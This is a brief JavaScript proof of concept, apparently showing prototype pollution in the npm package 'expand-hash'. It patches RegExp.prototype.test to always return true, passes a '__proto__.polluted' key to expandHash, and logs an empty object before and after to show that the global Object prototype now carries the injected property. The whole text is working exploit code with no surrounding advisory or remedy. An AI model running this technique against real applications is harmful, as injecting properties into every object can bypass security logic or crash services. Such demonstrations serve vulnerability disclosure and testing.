RegExp.prototype.test = () => true;
var expandHash = require('expand-hash');
var obj = {};
console.log({}.polluted);
expandHash({ '__proto__.polluted': 'yes' });
console.log({}.polluted);